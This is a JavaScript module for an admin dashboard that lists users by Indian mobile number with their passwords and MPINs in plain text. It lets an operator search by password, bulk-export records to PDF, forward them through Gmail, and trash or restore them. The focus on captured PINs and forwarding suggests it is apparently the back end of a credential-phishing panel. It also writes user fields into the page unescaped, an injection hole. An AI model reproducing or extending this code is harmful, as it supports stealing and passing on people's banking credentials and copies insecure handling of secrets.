import { dbApi } from '../../shared/js/supabase.js';
import { sharedUtils } from '../../shared/js/utils.js';
import { searchHelper } from './search.js';
import { filterHelper } from './filters.js';
import { gmailHelper } from './gmail.js';
import { pdfHelper } from './pdf.js';
import './auth.js';

document.addEventListener('DOMContentLoaded', async () => {
    const path = window.location.pathname;

    if (path.includes('users.html') || path.endsWith('/users')) {
        await renderUsersTable();

        document.getElementById('user-search').addEventListener('input', () => renderUsersTable());
        document.getElementById('user-filter').addEventListener('change', () => renderUsersTable());
        document.getElementById('user-sort').addEventListener('change', () => renderUsersTable());
        document.getElementById('user-date-filter').addEventListener('change', () => renderUsersTable());

        const btnAllPdf = document.getElementById('btn-download-all-pdf');
        if (btnAllPdf) {
            btnAllPdf.addEventListener('click', async () => {
                const allUsers = await dbApi.select('users');
                // Sort date wise (latest first)
                const sorted = [...allUsers].sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
                pdfHelper.exportAllUsers(sorted);
            });
        }
    }

    if (path.includes('user-details.html') || path.endsWith('/user-details')) {
        await renderUserDetails();
    }
});

async function renderUsersTable() {
    let users = await dbApi.select('users');

    // Instant Search Filter (Mobile, Password, MPIN, Status)
    const searchVal = document.getElementById('user-search').value;
    users = searchHelper.filterUsers(users, searchVal);

    // Status Filter
    const filterVal = document.getElementById('user-filter').value;
    users = filterHelper.filterByStatus(users, filterVal);

    // Date Filter
    const dateVal = document.getElementById('user-date-filter').value;
    if (dateVal) {
        users = users.filter(u => u.created_at && u.created_at.startsWith(dateVal));
    }

    // Sort
    const sortVal = document.getElementById('user-sort').value;
    users = filterHelper.sortUsers(users, sortVal);

    const tbody = document.getElementById('users-table-body');
    if (!tbody) return;
    tbody.innerHTML = '';

    users.forEach(u => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td><a href="user-details.html?id=${u.id}" class="mobile-link" style="color: var(--primary-color); font-weight: 800; text-decoration: underline;">+91 ${u.mobile}</a></td>
            <td><strong>${u.password}</strong></td>
            <td><strong>${u.mpin || '<em>Not Set</em>'}</strong></td>
            <td><span class="status-badge status-${u.status}">${u.status.toUpperCase()}</span></td>
            <td><strong>${u.login_count}</strong></td>
            <td>${sharedUtils.formatDate(u.created_at)}</td>
            <td>${sharedUtils.formatTime(u.created_at)}</td>
            <td>${sharedUtils.formatDate(u.last_login)} ${sharedUtils.formatTime(u.last_login)}</td>
            <td>
                <div class="action-btns">
                    <button class="btn btn-secondary btn-sm btn-view-user" data-id="${u.id}">🔍 View</button>
                    <button class="btn btn-primary btn-sm btn-gmail-user" data-id="${u.id}">📧 Gmail</button>
                    <button class="btn btn-secondary btn-sm btn-pdf-user" data-id="${u.id}">📄 PDF</button>
                    <button class="btn btn-danger btn-sm btn-trash-user" data-id="${u.id}">🗑️</button>
                </div>
            </td>
        `;
        tbody.appendChild(tr);
    });

    document.querySelectorAll('.btn-view-user').forEach(btn => btn.addEventListener('click', (e) => {
        window.location.href = `user-details.html?id=${e.target.getAttribute('data-id')}`;
    }));

    document.querySelectorAll('.btn-gmail-user').forEach(btn => btn.addEventListener('click', (e) => {
        const id = e.target.getAttribute('data-id');
        const u = users.find(x => x.id === id);
        if (u) gmailHelper.compose(u);
    }));

    document.querySelectorAll('.btn-pdf-user').forEach(btn => btn.addEventListener('click', (e) => {
        const id = e.target.getAttribute('data-id');
        const u = users.find(x => x.id === id);
        if (u) pdfHelper.exportUser(u);
    }));

    document.querySelectorAll('.btn-trash-user').forEach(btn => btn.addEventListener('click', async (e) => {
        if (confirm("Move user to trash?")) {
            const id = e.target.getAttribute('data-id');
            const match = await dbApi.select('users', { id });
            if (match.length > 0) {
                await dbApi.insert('trash', { original_table: 'users', record_id: id, record_data: match[0] });
                await dbApi.update('users', { status: 'deleted' }, { id });
                await dbApi.insert('activity_logs', { action_type: 'Delete History', description: `Moved user ${match[0].mobile} to trash`, performed_by: 'Admin' });
                sharedUtils.showToast("User moved to trash.", "success");
                renderUsersTable();
            }
        }
    }));
}

async function renderUserDetails() {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('id');
    if (!id) {
        // If no ID specified, pick the latest user for convenience
        const allUsers = await dbApi.select('users');
        if (allUsers.length > 0) {
            window.location.href = `user-details.html?id=${allUsers[0].id}`;
            return;
        }
        sharedUtils.showToast("No user found.", "error");
        return;
    }

    const users = await dbApi.select('users', { id });
    if (users.length === 0) return;
    const u = users[0];

    document.getElementById('detail-mobile').innerText = "+91 " + u.mobile;
    document.getElementById('detail-status').innerText = u.status.toUpperCase();
    document.getElementById('detail-status').className = `status-badge status-${u.status}`;
    document.getElementById('detail-password').innerText = u.password;
    document.getElementById('detail-mpin').innerText = u.mpin || 'Not Set';
    document.getElementById('detail-login-count').innerText = u.login_count;
    document.getElementById('detail-created').innerText = `${sharedUtils.formatDate(u.created_at)} ${sharedUtils.formatTime(u.created_at)}`;
    document.getElementById('detail-last-login').innerText = `${sharedUtils.formatDate(u.last_login)} ${sharedUtils.formatTime(u.last_login)}`;
    document.getElementById('detail-device').innerText = u.device || 'Windows / Chrome';
    document.getElementById('detail-ip').innerText = u.ip || '216.198.79.67';

    if (u.status === 'deleted') {
        document.getElementById('btn-restore-user').style.display = 'inline-block';
        document.getElementById('btn-move-trash').style.display = 'none';
    }

    document.getElementById('btn-forward-gmail').addEventListener('click', () => {
        gmailHelper.compose(u);
    });

    document.getElementById('btn-download-pdf').addEventListener('click', () => {
        pdfHelper.exportUser(u);
    });

    document.getElementById('btn-move-trash').addEventListener('click', async () => {
        if (confirm("Move to trash?")) {
            await dbApi.insert('trash', { original_table: 'users', record_id: u.id, record_data: u });
            await dbApi.update('users', { status: 'deleted' }, { id: u.id });
            await dbApi.insert('activity_logs', { action_type: 'Delete History', description: `Moved user ${u.mobile} to trash`, performed_by: 'Admin' });
            sharedUtils.showToast("Moved to trash.", "success");
            setTimeout(() => { window.location.href = 'users.html'; }, 1000);
        }
    });

    const btnRestore = document.getElementById('btn-restore-user');
    if (btnRestore) {
        btnRestore.addEventListener('click', async () => {
            await dbApi.update('users', { status: 'completed' }, { id: u.id });
            await dbApi.delete('trash', { record_id: u.id });
            await dbApi.insert('activity_logs', { action_type: 'Restore History', description: `Restored user ${u.mobile}`, performed_by: 'Admin' });
            sharedUtils.showToast("User restored!", "success");
            setTimeout(() => { window.location.reload(); }, 1000);
        });
    }
}
